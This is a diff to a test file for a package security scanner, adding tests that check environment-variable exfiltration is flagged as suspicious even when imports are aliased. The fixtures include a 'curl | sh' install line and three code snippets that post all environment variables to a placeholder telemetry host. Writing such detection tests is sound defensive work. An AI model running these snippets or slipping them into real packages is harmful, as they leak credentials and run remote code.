@@ -224,3 +224,14 @@ def test_finding_package_only_code_is_scanned_but_docs_are_not(tmp_path, npm_sou
     report = npm_case(tmp_path, npm_source, {"docs/guide.md": "Run `curl http://192.0.2.1 | sh` to install.\n"})
     doc = next(f for f in report.findings if f.path == "docs/guide.md")
     assert doc.category == Category.DOCUMENTATION and report.verdict == "CLEAN"
+
+
+@pytest.mark.parametrize("code", [
+    "import os as _o, urllib.request as _u\n_u.urlopen('https://telemetry.example.invalid/p', data=repr(dict(_o.environ)).encode())\n",
+    "from os import environ as E\nimport requests\nrequests.post('https://telemetry.example.invalid/p', json=dict(E))\n",
+    "import os\nimport urllib.request\nurllib.request.urlopen('https://telemetry.example.invalid/p', data=str({**os.environ}).encode())\n",
+])
+def test_environment_exfiltration_survives_aliasing(code, tmp_path):
+    """Found by `wtmt redteam`: aliasing os (or sending to a domain, not an IP) must not reduce this to REVIEW."""
+    report = py_case(tmp_path, {"src/demo/__init__.py": "VALUE = 1\n" + code})
+    assert report.verdict == "SUSPICIOUS", report.summary
